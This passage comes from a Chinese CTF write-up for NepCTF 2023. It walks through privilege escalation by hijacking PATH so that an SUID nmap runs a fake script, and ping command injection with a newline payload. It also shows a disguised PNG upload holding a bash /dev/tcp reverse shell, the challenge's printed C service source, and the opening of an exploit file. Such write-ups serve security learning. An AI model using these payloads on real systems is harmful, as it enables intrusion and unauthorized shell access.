title="法二"></a>法二</h4><p>题目提示环境变量提权</p><p>先找拥有suid权限的</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -user root -perm -4000 -print 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br><br><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -perm -u=s -type f 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br><br>#操作时&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span>会报错<br></code></pre></td></tr></table></figure><p>只有nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; ports-alive   <br><span class="hljs-built_in">chmod</span> 777 ports-alive<br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>nmap 127.0.0.1<br><br></code></pre></td></tr></table></figure><p>一定要是<code>ports-alive</code>文件，因为<code>nmap</code>执行时会报错<code>ports-alive：not found</code>（就是这里被坑了）</p><p>nmap会调用<code>ports-alive</code>文件</p><h3 id="独步天下-破除虚妄-探见真实"><a href="#独步天下-破除虚妄-探见真实" class="headerlink" title="独步天下-破除虚妄_探见真实"></a>独步天下-破除虚妄_探见真实</h3><p>该类题为内网题目，需要使用内网工具进行内网探测  （这里无环境复现，也没有实际尝试过，也不会尝试，所以探测过程就不写了 ，下次一定）</p><p>运行<code>ports-alive</code>(题目中存在的端口探测脚本)</p><p><code>ports-alive not found</code> 是因为使用的是<code>sh</code>而<code>ports-alive</code>中是<code>#!/bin/bash</code>，把该标注修改为<code>#!/bin/sh</code> （那上面的nmap就不知道什么原因了）</p><p><code>./ports-alive 192.168.200.1 0 100</code></p><p>发现80和82端口</p><p>打开82端口</p><p><img src="/2023/08/31/NepCTF2023/web1.png"></p><p>两处很明显能利用的地方</p><p>先尝试ping命令执行， <code>; &amp;&amp; || %0a</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip_address</span>=<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">0</span>als -l /<br></code></pre></td></tr></table></figure><p>flag什么权限都没有 （用户为mysql）              flag_mini什么权限也没有(用户为ctf)</p><p>第二关是读取flag_mini</p><p>大佬说尝试反弹shell回来，但这里做了一些过滤（官方说ban了chmod）</p><p>我猜测bash什么的应该是被禁用了，不然应该能直接bash反弹shell</p><p>然后想起文件上传</p><p>读取app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, url_for, redirect<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> ctypes.util<br><span class="hljs-keyword">import</span> time<br>os.environ[<span class="hljs-string">&#x27;FLASK_ENV&#x27;</span>] = <span class="hljs-string">&#x27;production&#x27;</span><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">&#x27;./&#x27;</span><br><br>lib_name=<span class="hljs-string">&#x27;./libping.so&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_ping_library</span>():<br>    <span class="hljs-comment"># 加载共享库</span><br>    mylib = ctypes.CDLL(lib_name)<br>    <span class="hljs-keyword">return</span> mylib<br><br>mylib = load_ping_library()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ping&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ping</span>():<br>    <span class="hljs-keyword">global</span> mylib<br>    ip_address = request.form[<span class="hljs-string">&#x27;ip_address&#x27;</span>]<br>    result = ctypes.create_string_buffer(<span class="hljs-number">4096</span>*<span class="hljs-number">2</span>)<br>    mylib.ping(ip_address.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), result)<br>    <span class="hljs-keyword">return</span> result.value.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload_avatar&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_avatar</span>():<br>    <span class="hljs-keyword">if</span> request.headers.get(<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>) != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are not allowed to upload files from this IP address.&quot;</span> + <span class="hljs-string">&quot; Your IP is: &quot;</span> + request.headers.get(<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        <span class="hljs-keyword">return</span> redirect(request.url)<br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(request.url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> allowed_file(file.filename):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file format. Only PNG files are allowed.&#x27;</span><br>    <span class="hljs-comment"># 限制文件大小为 5KB</span><br>    MAX_FILE_SIZE = <span class="hljs-number">5</span> * <span class="hljs-number">1024</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(file.read()) &gt; MAX_FILE_SIZE:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File too large. Maximum size is 5KB.&#x27;</span><br>    <span class="hljs-comment"># 将文件保存到服务器</span><br>    file.seek(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 重置文件读取指针</span><br>    file.save(os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], <span class="hljs-string">&#x27;avatar.png&#x27;</span>))<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allowed_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">and</span> filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>].lower() == <span class="hljs-string">&#x27;png&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">82</span>,debug=<span class="hljs-literal">False</span>,use_reloader=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>看到文件上传的路由，审计一下</p><p>要求<code>X-Forwarded-For</code>请求头为<code>127.0.0.1</code>，限定文件后缀为png，上传的png文件最后命名为<code>avatar.png</code></p><p>因为要反弹shell，（可以用python，也可以用C语言）</p><p>上传png文件内容为</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">import <span class="hljs-built_in">os</span><br><span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><p><code>python3 avatar.png</code>执行文件，成功反弹shell</p><hr><p>这里之后的内容都不理解</p><p>需要做的是提权，看一下ps -ef有什么可疑进程</p><p><img src="/2023/08/31/NepCTF2023/web2.png"></p><p>查看identity源码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/md5.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-comment">//gcc -o test1 test1.c -lcrypto -lm -lrt</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_dir</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> fd=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/home/ctf/sandbox/&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    MD5_CTX ctx;<br>    <span class="hljs-type">char</span> md5_res[<span class="hljs-number">17</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">100</span>]=<span class="hljs-string">&quot;NEPCTF_6666&quot;</span>;<br>    <span class="hljs-type">char</span> sandbox_dir[<span class="hljs-number">100</span>]=<span class="hljs-string">&quot;/home/ctf/sandbox/&quot;</span>;<br>    <span class="hljs-type">char</span> dir_name[<span class="hljs-number">100</span>]=<span class="hljs-string">&quot;/home/ctf/sandbox/&quot;</span>;<br>    FILE *new_pip;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">rlimit</span> r;<br>    r.rlim_max = r.rlim_cur = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">setrlimit</span>(RLIMIT_CORE, &amp;r);<br>    <span class="hljs-built_in">memset</span>(key, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(key));<br>    <span class="hljs-built_in">MD5_Init</span>(&amp;ctx);<br>    <span class="hljs-built_in">MD5_Update</span>(&amp;ctx, key, <span class="hljs-built_in">strlen</span>(key));<br>    <span class="hljs-built_in">MD5_Final</span>(md5_res, &amp;ctx);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>            <span class="hljs-built_in">sprintf</span>(&amp;(dir_name[i*<span class="hljs-number">2</span> + <span class="hljs-number">18</span>]), <span class="hljs-string">&quot;%02hhx&quot;</span>, md5_res[i]&amp;<span class="hljs-number">0xff</span>);<br>    <span class="hljs-type">char</span> cmd[<span class="hljs-number">100</span>];<br><br>    <span class="hljs-built_in">mkdir</span>(dir_name, <span class="hljs-number">0755</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">chdir</span>(dir_name)==<span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;chdir err, exiting\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-built_in">sprintf</span>(cmd,<span class="hljs-string">&quot;%s%s&quot;</span>,<span class="hljs-string">&quot;chmod 777 &quot;</span>,dir_name);<br>    <span class="hljs-built_in">system</span>(cmd);<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;bin&quot;</span>, <span class="hljs-number">0777</span>);<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;lib&quot;</span>, <span class="hljs-number">0777</span>);<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;lib64&quot;</span>, <span class="hljs-number">0777</span>);<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;lib/x86_64-linux-gnu&quot;</span>, <span class="hljs-number">0777</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /bin/bash bin/sh&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /lib/x86_64-linux-gnu/libdl.so.2 lib/x86_64-linux-gnu/&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /lib/x86_64-linux-gnu/libc.so.6 lib/x86_64-linux-gnu/&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /lib/x86_64-linux-gnu/libtinfo.so.5 lib/x86_64-linux-gnu/&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /lib64/ld-linux-x86-64.so.2 lib64/&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">chroot</span>(<span class="hljs-string">&quot;.&quot;</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;chroot err, exiting\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">command</span><span class="hljs-params">(<span class="hljs-type">int</span> server_socket,<span class="hljs-type">int</span> client_socket)</span> </span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x666</span>];<br>    <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,<span class="hljs-number">0x666</span>);<br>    <span class="hljs-built_in">write</span>(client_socket,<span class="hljs-string">&quot;Tmp-Command:&quot;</span>,<span class="hljs-built_in">sizeof</span>(<span class="hljs-string">&quot;Tmp-Command:&quot;</span>));<br>    <span class="hljs-built_in">read</span>(client_socket, buf, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">setgid</span>(<span class="hljs-number">1001</span>);<br>    <span class="hljs-built_in">setuid</span>(<span class="hljs-number">1001</span>);<br>    <span class="hljs-built_in">popen</span>(buf,<span class="hljs-string">&quot;w&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get_ip_address</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *interface_name, <span class="hljs-type">char</span> *ip_address)</span> </span>&#123;<br>    <span class="hljs-type">int</span> sockfd;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ifreq</span> ifr;<br>    <span class="hljs-comment">// Create a socket</span><br>    sockfd = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (sockfd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;Socket creation failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// Set the interface name in the ifreq structure</span><br>    <span class="hljs-built_in">strncpy</span>(ifr.ifr_name, interface_name, IFNAMSIZ - <span class="hljs-number">1</span>);<br>    ifr.ifr_name[IFNAMSIZ - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <span class="hljs-comment">// Get the IP address using the SIOCGIFADDR ioctl request</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(sockfd, SIOCGIFADDR, &amp;ifr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;ioctl failed&quot;</span>);<br>        <span class="hljs-built_in">close</span>(sockfd);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">close</span>(sockfd);<br>    <span class="hljs-comment">// Convert the binary IP address to a human-readable string</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> *addr = (<span class="hljs-keyword">struct</span> sockaddr_in *)&amp;ifr.ifr_addr;<br>    <span class="hljs-built_in">strcpy</span>(ip_address, <span class="hljs-built_in">inet_ntoa</span>(addr-&gt;sin_addr));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> </span>&#123;<br>    <span class="hljs-built_in">init_dir</span>();<br>    <span class="hljs-type">int</span> flag=<span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// Server setup</span><br>    <span class="hljs-type">int</span> server_socket, client_socket;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> server_addr, client_addr;<br>    <span class="hljs-type">socklen_t</span> client_len = <span class="hljs-built_in">sizeof</span>(client_addr);<br>    <span class="hljs-comment">// Create socket</span><br>    server_socket = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (server_socket &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;Socket creation failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">// Set up server address</span><br>    <span class="hljs-built_in">memset</span>(&amp;server_addr, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(server_addr));<br>    server_addr.sin_family = AF_INET;<br>    server_addr.sin_addr.s_addr = INADDR_ANY;<br>    server_addr.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">9999</span>);<br>    <span class="hljs-comment">// Bind socket to address and port</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">bind</span>(server_socket, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;server_addr, <span class="hljs-built_in">sizeof</span>(server_addr)) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;Bind failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">// Listen for incoming connections</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">listen</span>(server_socket, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;Listen failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Server is listening on port 9999...\n&quot;</span>);<br>    <span class="hljs-comment">// Accept connection from client</span><br>    client_socket = <span class="hljs-built_in">accept</span>(server_socket, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;client_addr, &amp;client_len);<br>    <span class="hljs-keyword">if</span> (client_socket &lt; <span class="hljs-number">0</span>) &#123;<br>        client_socket = <span class="hljs-built_in">accept</span>(server_socket, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;client_addr, &amp;client_len);<br>    &#125;<br>    <span class="hljs-type">char</span> client_ip[INET_ADDRSTRLEN];<br>    <span class="hljs-built_in">inet_ntop</span>(AF_INET, &amp;client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Client connected from IP: %s\n&quot;</span>, client_ip);<br>    <span class="hljs-type">char</span> ip_address[INET_ADDRSTRLEN];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *interface_name = <span class="hljs-string">&quot;eth0&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">get_ip_address</span>(interface_name, ip_address) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IP address of eth0: %s\n&quot;</span>, ip_address);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to get the IP address of eth0.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">while</span>(flag) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(client_ip,ip_address)) &#123;<br>            <span class="hljs-built_in">send</span>(client_socket,<span class="hljs-string">&quot;Only nc by localhost!\n&quot;</span>,<span class="hljs-built_in">sizeof</span>(<span class="hljs-string">&quot;Only nc by localhost!\n&quot;</span>),<span class="hljs-number">0</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            flag=<span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">command</span>(server_socket,client_socket);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/08/31/NepCTF2023/web3.png" alt="image.png"></p><p>文件描述符没有关闭，文件流也没关闭，可以连接父进程的<code>openat</code>和<code>fschmod</code>这两个内置函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 